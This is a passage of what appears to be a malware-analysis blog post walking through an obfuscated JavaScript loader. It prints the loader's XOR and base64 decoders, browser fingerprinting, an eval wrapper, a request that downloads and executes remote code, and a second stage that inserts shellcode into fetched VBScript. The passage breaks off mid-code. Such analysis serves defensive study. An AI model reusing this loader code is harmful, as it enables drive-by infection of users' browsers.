class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span> <span class="o">|</span> <span class="p">(</span><span class="nx">W3cN0hF2WFu</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="p">(</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">W3cN0hF2WFu</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="p">(</span><span class="nx">qT8fpZ1</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">)))</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="p">(</span><span class="mi">3</span> <span class="o">&amp;</span> <span class="nx">qT8fpZ1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="p">(</span><span class="nx">m3Z1Kc</span> <span class="o">=</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">fZ2S0q</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">OcKyWsdOFyq</span><span class="o">++</span><span class="p">))),</span> <span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">b8j5WMF</span><span class="p">),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">qT8fpZ1</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">)),</span> <span class="mi">64</span> <span class="o">!=</span> <span class="nx">m3Z1Kc</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">T82SkC</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">));</span>
        <span class="k">return</span> <span class="nx">T82SkC</span> <span class="o">=</span> <span class="nx">OygitP9</span><span class="p">.</span><span class="nx">quSjT4yyl</span><span class="p">(</span><span class="nx">T82SkC</span><span class="p">)</span>
    <span class="p">},</span>
    <span class="na">P1mnrrMi834</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">MQVCd</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="sr">/</span><span class="se">\r\n</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">"</span><span class="se">\n</span><span class="dl">"</span><span class="p">);</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">);</span>
            <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="mi">127</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">2048</span> <span class="p">?</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">192</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="mi">224</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span> <span class="o">&amp;</span> <span class="mi">63</span> <span class="o">|</span> <span class="mi">128</span><span class="p">)),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span> <span class="o">|</span> <span class="mi">128</span><span class="p">))</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">},</span>
    <span class="na">quSjT4yyl</span><span class="p">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">MQVCd</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b8j5WMF</span> <span class="o">=</span> <span class="dl">""</span><span class="p">,</span> <span class="nx">negriNm4A3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">UK1Az5</span> <span class="o">=</span> <span class="nx">zxh4w4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">negriNm4A3</span> <span class="o">&lt;</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];)(</span><span class="nx">ir4N7w</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">128</span> <span class="p">?</span> <span class="p">(</span><span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="nx">ir4N7w</span><span class="p">),</span> <span class="nx">negriNm4A3</span><span class="o">++</span><span class="p">)</span> <span class="p">:</span> <span class="mi">191</span> <span class="o">&lt;</span> <span class="nx">ir4N7w</span> <span class="o">&amp;&amp;</span> <span class="nx">ir4N7w</span> <span class="o">&lt;</span> <span class="mi">224</span> <span class="p">?</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">31</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">:</span> <span class="p">(</span><span class="nx">zxh4w4</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="nx">c3</span> <span class="o">=</span> <span class="nx">MQVCd</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">negriNm4A3</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="nx">b8j5WMF</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">]((</span><span class="mi">15</span> <span class="o">&amp;</span> <span class="nx">ir4N7w</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span> <span class="o">|</span> <span class="p">(</span><span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">zxh4w4</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span> <span class="o">|</span> <span class="mi">63</span> <span class="o">&amp;</span> <span class="nx">c3</span><span class="p">),</span> <span class="nx">negriNm4A3</span> <span class="o">+=</span> <span class="mi">3</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">b8j5WMF</span>
    <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next defined object is also for decoding.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">DwQ5oeN9ct</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">hxk4VZ3L8GC</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="nx">DwQ5oeN9ct</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">UsEJ64xf0P</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">D8H6A7MGHf</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">D8H6A7MGHf</span> <span class="o">&lt;</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">D8H6A7MGHf</span><span class="o">++</span><span class="p">,</span> <span class="nx">r5UpGh</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">r5UpGh</span> <span class="o">===</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
            <span class="nx">r5UpGh</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nx">UsEJ64xf0P</span> <span class="o">+=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">fromCharCode</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">D8H6A7MGHf</span><span class="p">)</span> <span class="o">^</span> <span class="nx">hxk4VZ3L8GC</span><span class="p">[</span><span class="dl">'</span><span class="s1">charCodeAt</span><span class="dl">'</span><span class="p">](</span><span class="nx">r5UpGh</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">UsEJ64xf0P</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>The next object, make sure that it is not in Chrome and Opera using, for example, User-Agent.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">BITU978SF7</span> <span class="o">=</span> <span class="p">((</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opr</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">addons</span><span class="dl">'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">opera</span><span class="dl">'</span><span class="p">]</span> <span class="o">||</span> <span class="nb">navigator</span><span class="p">[</span><span class="dl">'</span><span class="s1">userAgent</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1"> OPR/</span><span class="dl">'</span><span class="p">)</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="k">typeof</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">InstallTrigger</span><span class="dl">'</span><span class="p">]</span> <span class="o">!==</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span><span class="p">)</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="kc">false</span> <span class="o">||</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">document</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">documentMode</span><span class="dl">'</span><span class="p">])</span> <span class="o">+</span> <span class="k">this</span> <span class="o">+</span> <span class="p">(</span><span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="o">!!</span><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">chrome</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">runtime</span><span class="dl">'</span><span class="p">]);</span>
    <span class="k">return</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">cMa5g</span><span class="dl">'</span><span class="p">](</span><span class="nx">BITU978SF7</span><span class="p">[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The next object is for executing code. This is the most important object.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">String</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">eval</span><span class="dl">'</span><span class="p">](</span><span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">toString</span><span class="dl">'</span><span class="p">]());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>With these codes, the following code will be executed. This downloads the encoded data and executes it.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">onreadystatechange</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="mi">4</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">readyState</span><span class="dl">'</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="mi">200</span> <span class="o">==</span> <span class="k">this</span><span class="p">[</span><span class="dl">'</span><span class="s1">status</span><span class="dl">'</span><span class="p">])</span> <span class="p">{</span>
        <span class="kd">var</span> <span class="nx">W7iaUaId</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
        <span class="kd">var</span> <span class="nx">riqAvm0Is</span> <span class="o">=</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">W7iaUaId</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">riqAvm0Is</span><span class="p">[</span><span class="dl">'</span><span class="s1">eCWmvY</span><span class="dl">'</span><span class="p">]();</span>
    <span class="p">}</span>
<span class="p">};</span>

<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">open</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">post</span><span class="dl">'</span><span class="p">,</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">OygitP9</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">jbRyz</span><span class="dl">'</span><span class="p">](</span><span class="nx">mbwk99</span><span class="p">)[</span><span class="dl">'</span><span class="s1">kWNcdNj7d6U</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">RLGuTgUF3d0</span><span class="dl">'</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
<span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">VS4H8Yo1</span><span class="dl">'</span><span class="p">][</span><span class="dl">'</span><span class="s1">send</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">@@</span><span class="dl">'</span> <span class="p">[</span><span class="dl">'</span><span class="s1">i2668FMs5B8</span><span class="dl">'</span><span class="p">]());</span>
</code></pre></div></div>

<h2 id="encoded-data">Encoded data</h2>
<p>When decoding the code, it looks like the following.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">ZV7S8RUn</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">-- Shellcode here --</span><span class="dl">'</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">dIl15w</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">window</span><span class="p">[</span><span class="dl">'</span><span class="s1">XDomainRequest</span><span class="dl">'</span><span class="p">]();</span>
<span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">onload</span><span class="dl">'</span><span class="p">]</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">H2Kqgnp</span> <span class="o">=</span> <span class="nx">dIl15w</span><span class="p">[</span><span class="dl">'</span><span class="s1">responseText</span><span class="dl">'</span><span class="p">];</span>
    <span class="kd">var</span> <span class="nx">WW7QZmX</span> <span class="o">=</span> <span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;script language="vbscript"&gt;</span><span class="dl">'</span><span class="p">),</span><span class="nx">H2Kqgnp</span><span class="p">[</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">&lt;/body&gt;</span><span class="dl">'</span><span class="p">));</span>
    <span class="kd">var</span> <span class="nx">l1a2N5kr</span> <span class="o">=</span> <span class="nx">WW7QZmX</span><span class="p">[</span><span class="dl">'</span><span class="s1">split</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\n</span><span class="dl">'</span><span class="p">);</span>
    <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">L8c4YdRG</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">L8c4YdRG</span> <span class="o">&lt;</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="dl">'</span><span class="s1">length</span><span class="dl">'</span><span class="p">];</span> <span class="nx">L8c4YdRG</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span> <span class="o">||</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
            <span class="kd">var</span> <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%ue8fc%u008</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">#{encoded_payload}</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">%u8b55%u81ec</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">g68j2okJh5D</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">REPLACE_SHELLCODE_HERE</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="kd">var</span> <span class="nx">zEZGDPaGVEt</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">substring</span><span class="dl">'</span><span class="p">](</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">),</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="s1">"</span><span class="dl">'</span><span class="p">,</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="nx">g68j2okJh5D</span><span class="p">)));</span>
            <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">]</span> <span class="o">=</span> <span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">replace</span><span class="dl">'</span><span class="p">](</span><span class="nx">zEZGDPaGVEt</span><span class="p">,</span><span class="nx">ZV7S8RUn</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nx">l1a2N5kr</span><span class="p">[</span><span class="nx">L8c4YdRG</span><span class="p">][</span><span class="dl">'</span><span class="s1">indexOf</span><span class="dl">'</span><span class="p">](</span><span class="dl">'</span><span class="se">\'</span><span class="dl">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
